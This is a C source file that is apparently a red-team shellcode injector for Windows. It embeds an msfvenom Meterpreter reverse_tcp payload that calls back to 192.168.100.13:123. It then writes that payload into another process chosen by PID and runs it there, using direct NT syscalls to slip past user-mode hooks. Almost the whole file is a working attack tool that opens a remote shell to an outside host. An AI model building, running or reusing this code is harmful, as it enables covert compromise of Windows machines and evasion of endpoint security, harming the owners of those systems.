#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include "nt_header.h"

NTSTATUS STATUS;
/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f c exitfunc=thread*/

const unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
"\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x00\x7b\xc0\xa8\x64\x0d\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";


SIZE_T shellcode_size = sizeof(shellcode);

DWORD dwNtOpenProcessSSN;
DWORD dwNtAllocateVirtualMemorySSN;
DWORD dwNtWriteVirtualMemorySSN;
DWORD dwNtProtectVirtualMemorySSN;
DWORD dwNtCreateThreadExSSN;
DWORD dwNtWaitForSingleObjectSSN;
DWORD dwNtFreeVirtualMemorySSN;
DWORD dwNtCloseSSN;

BOOL DirectSyscallInject(DWORD PID, const unsigned char *shellcode, SIZE_T shellcode_size);
void GetSSN(_In_ HMODULE hNTDLL, _In_ LPCSTR NtFuncName, _Out_ PDWORD NtFuncSSN);

int main(int argc , char **argv) {
	if (argc < 2) {
		printf("[x] Usage %s <PID>\n", argv[0]);
		return -1;
	}

	DirectSyscallInject( (DWORD) atoi(argv[1]) , shellcode, shellcode_size);

	return 0;
}


void GetSSN( _In_ HMODULE hNTDLL, _In_ LPCSTR NtFuncName, _Out_ PDWORD NtFuncSSN) {

	UINT_PTR NtFuncAddress = 0;
	NtFuncAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFuncName);
	if (NtFuncAddress == 0) {
		printf("[x] GetProcAddress failed, err -> %d\n", GetLastError());
		exit(-1);
	}
	//printf("[+] Got %s address\n", NtFuncName);

	printf("[x] the ssn is 0x%lx", ((PBYTE)(NtFuncAddress + 0x4))[0]);
	// Dereference SSN from the memory offset
	*NtFuncSSN = ((PBYTE)(NtFuncAddress + 0x4))[0];
	printf("[0x%p] [0x%0.3lx] -> %s\n", (PVOID)NtFuncAddress, NtFuncSSN, NtFuncName);
	return;
}

BOOL DirectSyscallInject(DWORD PID, const unsigned char *shellcode, SIZE_T shellcode_size) {

	// Get SSNs
	HMODULE hNTDLL = GetModuleHandle(TEXT("ntdll"));
	if (hNTDLL == NULL) {
		printf("[x] GetModuleHandle err -> %d\n", GetLastError());
	}

	printf("[+] NTDLL ADDRESS [0x%p]\n", hNTDLL);
	


	GetSSN(hNTDLL, "NtOpenProcess", &dwNtOpenProcessSSN);
	GetSSN(hNTDLL, "NtAllocateVirtualMemory", &dwNtAllocateVirtualMemorySSN);
	GetSSN(hNTDLL, "NtWriteVirtualMemory", &dwNtWriteVirtualMemorySSN);
	GetSSN(hNTDLL, "NtProtectVirtualMemory", &dwNtProtectVirtualMemorySSN);
	GetSSN(hNTDLL, "NtCreateThreadEx", &dwNtCreateThreadExSSN);
	GetSSN(hNTDLL, "NtWaitForSingleObject", &dwNtWaitForSingleObjectSSN);
	GetSSN(hNTDLL, "NtFreeVirtualMemory", &dwNtFreeVirtualMemorySSN);
	GetSSN(hNTDLL, "NtClose", &dwNtCloseSSN);

	printf("[+] Populated SSNs..\n");
	// GET process handle
	HANDLE hProc = NULL;
	ObjectAttributes ObjectAttr = { sizeof(ObjectAttributes), NULL };
	CLIENT_ID CID = { 0 };
	CID.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
	printf("[+] Calling NtOpenProcess\n");
	STATUS = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjectAttr, &CID);
	printf("[NtOpenProcess] GETTING Process..\n");
	if (STATUS != STATUS_SUCCESS) {
		printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		return 1;
	}

	// ALLOCATE MEMORY
	PVOID reserved_mem = NULL;
	printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS = NtAllocateVirtualMemory(hProc, &reserved_mem, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n", STATUS);
		return 1;
	}
	printf("[NtAllocateVirtualMemory] Memory Allocated!\n");

	// Write MEM
	printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
	SIZE_T BytesWritten = 0;
	STATUS = NtWriteVirtualMemory(hProc, reserved_mem, shellcode, shellcode_size, &BytesWritten);
	if (STATUS != STATUS_SUCCESS) {
		printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n", STATUS);
		printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n", BytesWritten, shellcode_size);
		return 1;
	}
	printf("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n", shellcode_size, BytesWritten);

	// Change MEM protections
	ULONG Old_Protect = 0;
	printf("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
	STATUS = NtProtectVirtualMemory(hProc, &reserved_mem, &shellcode_size, PAGE_EXECUTE_READ, &Old_Protect);
	if (STATUS != STATUS_SUCCESS) {
		printf("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n", STATUS);
		return 1;
	}
	printf("[NtProtectVirtualMemory] [--X] added!\n");


	// Exec Shellcode
	HANDLE hThread = NULL;
	ObjectAttributes ObjectAttr_thread = { sizeof(ObjectAttributes), NULL };
	printf("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &ObjectAttr_thread, hProc, reserved_mem, NULL, 0, 0, 0, 0, NULL);

	if (STATUS != STATUS_SUCCESS) {
		printf("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n", STATUS);
		return 1;
	}
	printf("[NtCreateThreadEx] Thread Created (0x%p)..\n", hThread);


	printf("[0x%p] Waiting to Finish Execution\n", hThread);
	STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
	printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n", hThread);


	// CLEANUP
	if (reserved_mem) {
		STATUS = NtFreeVirtualMemory(hProc, &reserved_mem, &shellcode_size, MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
			printf("[NtFreeVirtualMemory] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
		}
		printf("[NtFreeVirtualMemory] decommitted allocated buffer (0x%p) from process memory\n", reserved_mem);
	}
	if (hThread) {
		printf("[NtClose] Closing hThread handle\n");
		NtClose(hThread);
	}
	if (hProc) {
		printf("[NtClose] Closing hProcess handle\n");
		NtClose(hProc);
	}

	return 0;
}